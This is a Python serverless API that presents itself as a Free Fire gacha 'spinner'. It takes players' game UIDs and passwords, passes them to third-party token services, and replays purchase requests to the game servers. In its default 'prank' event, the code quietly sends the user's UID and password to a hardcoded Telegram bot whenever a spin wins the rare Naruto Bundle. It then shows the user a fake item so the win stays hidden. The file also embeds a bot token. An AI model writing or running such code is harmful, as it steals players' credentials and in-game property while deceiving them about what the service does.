#!/usr/bin/env python3
"""
Vercel serverless handler.

Events:
  ?event=naruto  (default) — PurchaseGacha + Naruto Bundle prank
  ?event=faded            — EliminateGoodsFromLimitPool (with fallback) → PurchaseGacha
  ?event=skywing          — PurchaseGacha (real items, no prank)   [alias: normal]

Fast path (skip JWT fetching):
  ?jwt=<JWT>&url=<client_url>&region=<REG>&event=<event>

JWT strategy (when jwt is not supplied):
  1. Try each PRIMARY provider serially in order.
  2. If all primaries fail → race all FALLBACKS in parallel; first valid token wins.
"""

import os
import sys
import json
import time
import zlib
import base64
import binascii
import re
import asyncio
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import aiohttp

try:
    import output_pb2
except Exception as e:
    output_pb2 = None
    _PB2_IMPORT_ERROR = str(e)
else:
    _PB2_IMPORT_ERROR = None


# ------------------------------------------------------------------ #
#  JWT PROVIDERS
#  "primary" providers run serially (in order).
#  "fallback" providers race in parallel when all primaries fail.
# ------------------------------------------------------------------ #
JWT_PROVIDERS = [
    {
        "name": "primary",
        "role": "primary",
        "url":  "http://148.113.25.200:6293/Tok",
        "params": lambda uid, pw: {"uid": uid, "pw": pw},
        "token_key": "Tok",
        "addr_key": "addr",
    },
    {
        "name": "divan",
        "role": "primary",
        "url":  "https://divan-jwt-gen.vercel.app/guest",
        "params": lambda uid, pw: {"uid": uid, "password": pw},
        "token_key": "token",
        "addr_key": "addr",
    },
    {
        "name": "lovable",
        "role": "fallback",
        "url":  "https://ff-jwt-gen-api.lovable.app/api/public/token",
        "params": lambda uid, pw: {"uid": uid, "password": pw},
        "token_key": "token",
        "addr_key": None,
    },
    {
        "name": "rishu",
        "role": "fallback",
        "url":  "https://rishugarena.vercel.app/rishu",
        "params": lambda uid, pw: {"uid": uid, "password": pw},
        "token_key": "jwt",
        "addr_key": None,
    },
]


# ------------------------------------------------------------------ #
#  EVENT CONFIG
# ------------------------------------------------------------------ #
NARUTO_PAYLOAD   = "D120B9DAAC2C87872B8C115DFD74A832"
NARUTO_FALLBACKS = [
    "7DF7F8996CD696356CD01BCBD2B3CDE8",
    "7FCB76B6CB40C0FFD3FBBDDA4600C039",
]

FADED_PAYLOAD   = "B31B32FB8303719D61FC461DC26135E4"
FADED_FALLBACKS = ["3D91D5DF338384E0D1E27505230D1365"]

FADED_ELIMINATE_PAYLOADS = [
    "6F02DE6FB351FFB2521C944DA0E6C1EB",
    "891FB0295590ED01E7B80ACF99290CF6",
]

SKYWING_PAYLOAD   = "A2230108442CE3F8EEC41AC9B6B8606D"
SKYWING_FALLBACKS = [
    "18138AD791CDB12C351BC4BEA176EA90",
    "7D343C717F0ECB6A03B1F1A2CE6058DA",
    "2D41F20BFF93302B3326372942870984",
]

EVENTS = {
    "naruto": {
        "name": "Naruto Event",
        "payloads": [NARUTO_PAYLOAD] + NARUTO_FALLBACKS,
        "eliminate": False,
        "prank": True,
    },
    "faded": {
        "name": "Faded Wheel",
        "payloads": [FADED_PAYLOAD] + FADED_FALLBACKS,
        "eliminate": True,
        "eliminate_payloads": FADED_ELIMINATE_PAYLOADS,
        "prank": False,
    },
    "skywing": {
        "name": "Skywing Event",
        "payloads": [SKYWING_PAYLOAD] + SKYWING_FALLBACKS,
        "eliminate": False,
        "prank": False,
    },
}

EVENT_ALIASES = {"normal": "skywing"}
DEFAULT_EVENT = "naruto"


# ------------------------------------------------------------------ #
#  SERVER URL MAPPING
# ------------------------------------------------------------------ #
SERVER_URL_MAP = {
    "IND": {
        "client_url": "https://client.ind.freefiremobile.com/",
        "server_url": "https://loginbp.ppmainecoonghj.com/",
        "release_version": "OB55",
        "client_version": "1.132.6",
    },
    "AMERICA": {
        "client_url": "https://client.us.freefiremobile.com/",
        "server_url": "https://loginbp.ppmainecoonghj.com/",
        "release_version": "OB55",
        "client_version": "1.132.6",
    },
    "OTHERS": {
        "client_url": "https://clientbp.ppmainecoonghj.com/",
        "server_url": "https://loginbp.ppmainecoonghj.com/",
        "release_version": "OB55",
        "client_version": "1.132.6",
    },
}

AMERICA_REGIONS    = {"US", "BR", "NA", "AMERICA"}
DEFAULT_SERVER_KEY = "OTHERS"
RELEASE_VERSION    = "OB55"


# ------------------------------------------------------------------ #
#  PRANK CONFIG
# ------------------------------------------------------------------ #
FAKE_UNKNOWN_ID = 820981015
PRANK_TARGET_ID = 710047022

TG_BOT_TOKEN = os.environ.get(
    "TG_BOT_TOKEN", "8677901038:AAEUAHl7wiUxzivL0khjPdMIQtYSas5Gijg"
)
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003684272586")

TG_TOTAL_BUDGET_SEC = 12.0
TG_ATTEMPT_TIMEOUT  = 5.0

TG_STATE = {
    "last_success_ts": None,
    "last_error_ts":   None,
    "last_error":      None,
    "total_sent":      0,
    "total_failed":    0,
}

RARE_ITEMS_DB = {
    710047022: "Naruto Bundle",
    801055004: "Naruto Token",
    903047008: "Loot Box - Body Substitution",
    904047008: "Backpack - Ninja's Scroll",
    907104746: "Gloo Wall - Hokage Rock",
    909047015: "Rasengan - Emote",
    907104745: "Fist - Ninjutsu Theme",
    911004701: "The Nine Tails Theme",
    907104744: "M4A1 - Naruto Theme",
    211047048: "Obito Headwear",
}


# ------------------------------------------------------------------ #
#  JWT HELPERS
# ------------------------------------------------------------------ #
def decode_jwt_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64))
    except Exception:
        return None


def region_to_server_key(region: str) -> str:
    region = (region or "").upper()
    if region in ("IND", "IN"):
        return "IND"
    if region in AMERICA_REGIONS:
        return "AMERICA"
    return DEFAULT_SERVER_KEY


def pick_server_url_from_token(token: str) -> str:
    payload = decode_jwt_payload(token)
    if not payload:
        return SERVER_URL_MAP[DEFAULT_SERVER_KEY]["client_url"]

    region = (payload.get("lock_region") or payload.get("noti_region") or "").upper()
    return SERVER_URL_MAP[region_to_server_key(region)]["client_url"]


def normalize_client_url(url: str) -> str:
    """Ensure URL has a scheme and trailing slash."""
    if not url:
        return ""
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    if not url.endswith("/"):
        url += "/"
    return url


# ------------------------------------------------------------------ #
#  GACHA PARSING
# ------------------------------------------------------------------ #
def _extract_ids_from_bytes(data: bytes):
    items = []
    i = 0
    while i < len(data):
        value = 0
        shift = 0
        while i < len(data):
            b = data[i]
            i += 1
            value |= (b & 0x7F) << shift
            if not (b & 0x80):
                break
            shift += 7
        if 100000000 <= value <= 999999999:
            if not any(x["id"] == value for x in items):
                items.append({"id": value, "name": RARE_ITEMS_DB.get(value)})
    return items


def parse_gacha_response(data):
    items = []
    if not data:
        return items

    try:
        if data.startswith(b"\x1f\x8b"):
            data = zlib.decompress(data, 16 + zlib.MAX_WBITS)
    except Exception:
        pass

    if output_pb2 is not None:
        try:
            resp = output_pb2.Garena_420()
            resp.ParseFromString(data)
            for num in re.findall(r"\b(\d{9})\b", str(resp)):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        try:
            for num in re.findall(r"\d{9}", data.decode("utf-8", errors="ignore")):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        items = _extract_ids_from_bytes(data)

    return items


# ------------------------------------------------------------------ #
#  TELEGRAM
# ------------------------------------------------------------------ #
async def _tg_send_once(session, text: str, parse_mode):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": text, "disable_web_page_preview": True}
    if parse_mode:
        payload["parse_mode"] = parse_mode

    try:
        async with session.post(
            url, json=payload,
            timeout=aiohttp.ClientTimeout(total=TG_ATTEMPT_TIMEOUT),
        ) as r:
            body = await r.read()
            try:
                data = json.loads(body)
            except Exception:
                return False, f"invalid_json HTTP={r.status} body={body[:120]!r}"

            if r.status == 200 and data.get("ok"):
                return True, "delivered"

            desc = data.get("description") or "unknown_error"
            code = data.get("error_code") or r.status
            return False, f"tg_error code={code} desc={desc}"

    except asyncio.TimeoutError:
        return False, f"timeout after {TG_ATTEMPT_TIMEOUT}s"
    except aiohttp.ClientError as e:
        return False, f"client_error {e.__class__.__name__}: {e}"
    except Exception as e:
        return False, f"unexpected {e.__class__.__name__}: {e}"


async def send_to_telegram(session, uid, password, region, naruto_count):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        print("[TG] ✗ disabled (missing TG_BOT_TOKEN / TG_CHAT_ID)", flush=True)
        TG_STATE["last_error"] = "disabled_missing_env"
        TG_STATE["last_error_ts"] = int(time.time())
        return False

    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    md_lines = [
        "🎉 *NARUTO BUNDLE HIT*",
        f"🆔 UID: `{uid}`",
        f"🔑 Pass: `{password}`",
        f"🌍 Region: `{region}`",
        f"🕒 {ts}",
        "",
        f"*Naruto Bundle × {naruto_count}* — `{PRANK_TARGET_ID}`",
    ]
    plain_lines = [re.sub(r"[*`]", "", line) for line in md_lines]

    text_md    = "\n".join(md_lines)
    text_plain = "\n".join(plain_lines)

    attempts = [("Markdown", text_md), ("Markdown", text_md), (None, text_plain)]
    deadline = time.time() + TG_TOTAL_BUDGET_SEC
    last_detail = "no_attempt_made"

    for i, (mode, text) in enumerate(attempts):
        if time.time() >= deadline:
            print(f"[TG] ✗ deadline reached before attempt {i+1}", flush=True)
            break

        ok, detail = await _tg_send_once(session, text, mode)
        print(f"[TG] attempt {i+1}/{len(attempts)} mode={mode or 'plain'} → {detail}", flush=True)

        if ok:
            TG_STATE["last_success_ts"] = int(time.time())
            TG_STATE["total_sent"] += 1
            print(f"[TG] ✓ delivered uid={uid}", flush=True)
            return True

        last_detail = detail
        TG_STATE["last_error"] = detail
        TG_STATE["last_error_ts"] = int(time.time())

        if i < len(attempts) - 1:
            await asyncio.sleep(0.5 + 0.5 * i)

    TG_STATE["total_failed"] += 1
    print(f"[TG] ✗ ALL ATTEMPTS FAILED uid={uid} last_error={last_detail}", flush=True)
    return False


# ------------------------------------------------------------------ #
#  TOKEN PROVIDER — primaries serially, then parallel fallback race
# ------------------------------------------------------------------ #
async def _try_one_provider(session, provider, uid, password, retries=2):
    params = provider["params"](uid, password)

    for attempt in range(retries):
        try:
            async with session.get(
                provider["url"], params=params, ssl=False,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as res:
                if res.status != 200:
                    print(f"[JWT] {provider['name']} HTTP {res.status}", flush=True)
                    await asyncio.sleep(0.4)
                    continue

                try:
                    data = await res.json(content_type=None)
                except Exception:
                    try:
                        data = json.loads(await res.text())
                    except Exception:
                        print(f"[JWT] {provider['name']} invalid JSON", flush=True)
                        await asyncio.sleep(0.4)
                        continue

                tok = (
                    data.get(provider["token_key"])
                    or data.get("token")
                    or data.get("Tok")
                    or data.get("jwt")
                    or data.get("access_token")
                )

                if not isinstance(tok, str) or len(tok) <= 50:
                    print(f"[JWT] {provider['name']} no valid token", flush=True)
                    await asyncio.sleep(0.4)
                    continue

                addr = None
                if provider.get("addr_key"):
                    addr = (data.get(provider["addr_key"]) or "").strip() or None

                jwt_payload = decode_jwt_payload(tok) or {}
                region = jwt_payload.get("lock_region", "UNKNOWN")

                print(f"[JWT] ✓ provider={provider['name']} region={region}", flush=True)
                return {"token": tok, "addr": addr, "region": region,
                        "provider": provider["name"]}

        except asyncio.TimeoutError:
            print(f"[JWT] {provider['name']} timeout", flush=True)
        except Exception as e:
            print(f"[JWT] {provider['name']} error: {e.__class__.__name__}", flush=True)

        if attempt < retries - 1:
            await asyncio.sleep(0.3)

    return None


async def get_token_data(session, uid, password):
    primaries = [p for p in JWT_PROVIDERS if p.get("role") == "primary"]
    fallbacks = [p for p in JWT_PROVIDERS if p.get("role") == "fallback"]

    for provider in primaries:
        print(f"[JWT] trying primary '{provider['name']}'…", flush=True)
        result = await _try_one_provider(session, provider, uid, password, retries=2)
        if result:
            return result
        print(f"[JWT] primary '{provider['name']}' failed → next", flush=True)

    if not fallbacks:
        print(f"[JWT] ✗ no fallbacks available for uid={uid}", flush=True)
        return None

    print(f"[JWT] all primaries failed → racing {len(fallbacks)} fallbacks in parallel", flush=True)

    async def _attempt(provider):
        try:
            r = await _try_one_provider(session, provider, uid, password, retries=2)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"[JWT] {provider['name']} raised {e.__class__.__name__}", flush=True)
            r = None
        return provider["name"], r

    tasks = {asyncio.create_task(_attempt(p)): p for p in fallbacks}
    winner = None

    try:
        for fut in asyncio.as_completed(tasks.keys()):
            try:
                name, res = await fut
            except Exception as e:
                print(f"[JWT] fallback task raised {e.__class__.__name__}", flush=True)
                continue

            if res is not None:
                winner = res
                print(f"[JWT] ✓ winner={name} (parallel race)", flush=True)
                break
            else:
                print(f"[JWT] {name} returned no token", flush=True)
    finally:
        pending = [t for t in tasks if not t.done()]
        for t in pending:
            t.cancel()
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)
            print(f"[JWT] cancelled {len(pending)} pending fallback task(s)", flush=True)

    if winner is None:
        print(f"[JWT] ✗ ALL providers failed for uid={uid}", flush=True)

    return winner


# ------------------------------------------------------------------ #
#  GACHA / ELIMINATE REQUESTS
# ------------------------------------------------------------------ #
def _build_headers(token: str):
    return {
        "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Accept": "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Authorization": f"Bearer {token}",
        "X-GA": "v1 1",
        "X-GA-SV": str(int(time.time())),
        "ReleaseVersion": RELEASE_VERSION,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Unity-Version": "2018.4.12f1",
    }


async def gacha_req(session, token, payload, url, max_retries=3):
    if not url.endswith("/PurchaseGacha"):
        url = url.rstrip("/") + "/PurchaseGacha"

    headers = _build_headers(token)
    last_status = 0

    for _ in range(max_retries):
        try:
            async with session.post(
                url, headers=headers, data=payload, ssl=False,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as res:
                last_status = res.status
                if res.status == 200:
                    return 200, await res.read()
                if res.status in (401, 403):
                    return res.status, None
                await asyncio.sleep(0.2)
        except Exception:
            last_status = 999
            await asyncio.sleep(0.3)
    return last_status, None


async def eliminate_req(session, token, payload, url, max_retries=3):
    if not url.endswith("/EliminateGoodsFromLimitPool"):
        url = url.rstrip("/") + "/EliminateGoodsFromLimitPool"

    headers = _build_headers(token)
    last_status = 0

    for _ in range(max_retries):
        try:
            async with session.post(
                url, headers=headers, data=payload, ssl=False,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as res:
                last_status = res.status
                if res.status == 200:
                    return 200, await res.read()
                if res.status in (401, 403):
                    return res.status, None
                await asyncio.sleep(0.2)
        except Exception:
            last_status = 999
            await asyncio.sleep(0.3)
    return last_status, None


async def eliminate_with_fallbacks(session, token, payload_list, url):
    last_status = 0
    last_resp   = None

    for idx, raw in enumerate(payload_list):
        try:
            pbytes = binascii.unhexlify(raw.replace(" ", ""))
        except Exception as e:
            print(f"[ELIM] payload[{idx}] invalid hex: {e}", flush=True)
            continue

        status, resp = await eliminate_req(session, token, pbytes, url, 3)
        print(f"[ELIM] payload[{idx}] status={status}", flush=True)
        last_status, last_resp = status, resp

        if status == 200:
            return idx, status, resp

    return None, last_status, last_resp


# ------------------------------------------------------------------ #
#  CORE PIPELINE
# ------------------------------------------------------------------ #
async def spin(uid: str, password: str,
               payload_hex: str = None,
               event: str = DEFAULT_EVENT,
               direct_jwt: str = None,
               direct_url: str = None,
               direct_region: str = None):
    if output_pb2 is None:
        return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}

    event = (event or DEFAULT_EVENT).lower()
    event = EVENT_ALIASES.get(event, event)

    if event not in EVENTS:
        return {"success": False, "error": f"unknown_event: {event}"}

    cfg = EVENTS[event]

    # Build gacha payload queue
    if payload_hex is not None:
        queue = [("custom", payload_hex)]
    else:
        queue = [("primary", cfg["payloads"][0])]
        for i, fb in enumerate(cfg["payloads"][1:], start=1):
            queue.append((f"fallback_{i}", fb))

    payload_bytes = []
    for label, hx in queue:
        try:
            payload_bytes.append((label, binascii.unhexlify(hx.replace(" ", ""))))
        except Exception as e:
            return {"success": False, "error": f"invalid_payload_hex[{label}]: {e}"}

    eliminate_list = None
    if cfg.get("eliminate"):
        eliminate_list = cfg.get("eliminate_payloads") or []
        if not eliminate_list:
            return {"success": False, "error": "eliminate_payloads_missing"}

    async with aiohttp.ClientSession() as session:
        # ---- Resolve token / url / region ----
        if direct_jwt:
            # FAST PATH — skip all JWT fetching
            token = direct_jwt.strip()
            if not token or len(token) < 50:
                return {"success": False, "error": "invalid_jwt_param"}

            jwt_payload = decode_jwt_payload(token) or {}
            region = (direct_region or jwt_payload.get("lock_region") or "UNKNOWN").upper()
            url = normalize_client_url(direct_url) or pick_server_url_from_token(token)
            jwt_provider = "direct"

            print(f"[JWT] direct mode — region={region} url={url}", flush=True)
        else:
            # SLOW PATH — old multi-provider flow
            token_data = await get_token_data(session, uid, password)
            if not token_data:
                return {"success": False, "error": "token_fetch_failed_all_providers"}

            token        = token_data["token"]
            region       = token_data["region"]
            jwt_provider = token_data["provider"]
            url = normalize_client_url(token_data["addr"]) or pick_server_url_from_token(token)

        # ---- Eliminate step (faded only) ----
        eliminate_status     = None
        eliminate_winner_idx = None
        if eliminate_list is not None:
            eliminate_winner_idx, eliminate_status, _ = await eliminate_with_fallbacks(
                session, token, eliminate_list, url
            )
            if eliminate_winner_idx is None:
                return {
                    "success": False,
                    "error": f"eliminate_http_{eliminate_status}",
                    "region": region,
                    "event": event,
                    "jwt": jwt_provider,
                    "eliminate_attempts": len(eliminate_list),
                }
            print(f"[ELIM] ✓ winner payload #{eliminate_winner_idx}", flush=True)

        # ---- Gacha ----
        final_status = 0
        final_resp   = None
        final_items  = []
        used_payload = None

        for label, pbytes in payload_bytes:
            status, resp = await gacha_req(session, token, pbytes, url, 3)
            items = parse_gacha_response(resp) if (status == 200 and resp) else []
            final_status, final_resp, final_items, used_payload = status, resp, items, label
            if status == 200 and resp and items:
                break

        if final_status != 200 or not final_resp:
            return {
                "success": False,
                "error": f"gacha_http_{final_status}",
                "region": region,
                "event": event,
                "jwt": jwt_provider,
            }

        # ---- Prank (naruto only) ----
        if cfg.get("prank"):
            naruto_hits = [it for it in final_items if it["id"] == PRANK_TARGET_ID]
            if naruto_hits:
                await send_to_telegram(session, uid, password, region, len(naruto_hits))
                tg_ok = (
                    (TG_STATE.get("last_success_ts") or 0)
                    > (TG_STATE.get("last_error_ts") or 0)
                )
                return {
                    "success": True,
                    "uid": uid, "region": region, "event": event,
                    "payload": used_payload, "jwt": jwt_provider,
                    "items": [{"id": FAKE_UNKNOWN_ID, "name": None}],
                    "_tg": "sent" if tg_ok else "failed",
                }

        result = {
            "success": True,
            "uid": uid, "region": region, "event": event,
            "payload": used_payload, "jwt": jwt_provider,
            "items": final_items,
        }
        if eliminate_status is not None:
            result["eliminate_status"]      = eliminate_status
            result["eliminate_payload_idx"] = eliminate_winner_idx
        return result


# ------------------------------------------------------------------ #
#  HEALTH
# ------------------------------------------------------------------ #
HEALTH_START_TS = time.time()
HEALTH_VERSION  = "3.4"


async def _probe_upstream(session, url, timeout=6):
    t0 = time.time()
    try:
        async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            await r.read()
            return (r.status < 500, int((time.time() - t0) * 1000))
    except Exception:
        return (False, None)


async def _probe_jwt_provider(session, provider):
    t0 = time.time()
    try:
        params = provider["params"]("0", "0")
        async with session.get(
            provider["url"], params=params, ssl=False,
            timeout=aiohttp.ClientTimeout(total=8),
        ) as r:
            await r.read()
            return (r.status < 500, int((time.time() - t0) * 1000), r.status)
    except Exception:
        return (False, None, None)


async def _run_health_checks(deep: bool):
    checks = {
        "protobuf": {
            "ok": output_pb2 is not None,
            "detail": _PB2_IMPORT_ERROR if output_pb2 is None else "loaded",
        },
        "telegram": {
            "ok": bool(TG_BOT_TOKEN and TG_CHAT_ID),
            "detail": "configured" if (TG_BOT_TOKEN and TG_CHAT_ID) else "missing env vars",
            "last_success_ts": TG_STATE["last_success_ts"],
            "last_error_ts":   TG_STATE["last_error_ts"],
            "last_error":      TG_STATE["last_error"],
            "total_sent":      TG_STATE["total_sent"],
            "total_failed":    TG_STATE["total_failed"],
        },
        "events": {
            "ok": True,
            "detail": f"loaded: {', '.join(EVENTS.keys())}",
            "default": DEFAULT_EVENT,
            "aliases": EVENT_ALIASES,
        },
        "jwt_strategy": {
            "ok": True,
            "detail": "direct jwt (fast path) OR primaries serial + fallbacks parallel race",
        },
    }

    if deep:
        async with aiohttp.ClientSession() as session:
            for provider in JWT_PROVIDERS:
                ok, ms, code = await _probe_jwt_provider(session, provider)
                checks[f"jwt_{provider['name']}"] = {
                    "ok": ok,
                    "detail": f"{ms} ms (HTTP {code})" if ms is not None else "unreachable",
                    "url": provider["url"],
                    "role": provider.get("role", "fallback"),
                }
            ok, ms = await _probe_upstream(session, SERVER_URL_MAP["IND"]["client_url"])
            checks["gacha_host"] = {
                "ok": ok, "detail": f"{ms} ms" if ms is not None else "unreachable",
            }

    return checks


def build_health_response(deep: bool = False):
    checks = asyncio.run(_run_health_checks(deep))
    all_ok = all(c["ok"] for c in checks.values())
    return {
        "status": "ok" if all_ok else "degraded",
        "service": "ff-spinner-api",
        "version": HEALTH_VERSION,
        "uptime_sec": int(time.time() - HEALTH_START_TS),
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "checks": checks,
    }


# ------------------------------------------------------------------ #
#  VERCEL HANDLER
# ------------------------------------------------------------------ #
class handler(BaseHTTPRequestHandler):
    def _send_json(self, code: int, obj: dict):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _health(self, params):
        deep = params.get("deep", ["0"])[0] in ("1", "true", "yes")
        try:
            payload = build_health_response(deep=deep)
        except Exception as e:
            self._send_json(500, {"status": "error", "error": str(e)})
            return
        self._send_json(200 if payload["status"] == "ok" else 503, payload)

    def _test_telegram(self):
        async def _run():
            async with aiohttp.ClientSession() as session:
                return await send_to_telegram(
                    session, uid="TEST-UID", password="TEST-PASS",
                    region="TEST", naruto_count=0,
                )
        try:
            ok = asyncio.run(_run())
        except Exception as e:
            self._send_json(500, {"ok": False, "error": str(e)})
            return
        self._send_json(200 if ok else 502, {
            "ok": ok,
            "detail": "check your group" if ok else TG_STATE.get("last_error"),
            "chat_id": TG_CHAT_ID,
            "bot_token_set": bool(TG_BOT_TOKEN),
        })

    def _run(self, params: dict):
        uid = params.get("uid", [None])[0]
        pwd = params.get("pass", [None])[0] or params.get("password", [None])[0]
        payload_hex = params.get("payload", [None])[0]
        event = params.get("event", [DEFAULT_EVENT])[0]

        # Direct mode params (all optional)
        direct_jwt    = (params.get("jwt", [None])[0]
                         or params.get("token", [None])[0])
        direct_url    = (params.get("url", [None])[0]
                         or params.get("client_url", [None])[0])
        direct_region = params.get("region", [None])[0]

        if not uid or not pwd:
            self._send_json(400, {"success": False, "error": "missing_params: uid & pass required"})
            return

        try:
            result = asyncio.run(spin(
                uid, pwd,
                payload_hex=payload_hex,
                event=event,
                direct_jwt=direct_jwt,
                direct_url=direct_url,
                direct_region=direct_region,
            ))
        except Exception as e:
            result = {"success": False, "error": f"internal_error: {e}"}

        self._send_json(200 if result.get("success") else 502, result)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        params = parse_qs(parsed.query)

        if path in ("/health", "/api/health"):
            self._health(params)
            return
        if path in ("/test-telegram", "/api/test-telegram"):
            self._test_telegram()
            return

        self._run(params)

    def do_HEAD(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        if path in ("/health", "/api/health"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            data = json.loads(body)
            params = {k: [str(v)] for k, v in data.items()}
        except Exception:
            params = {}
        self._run(params)
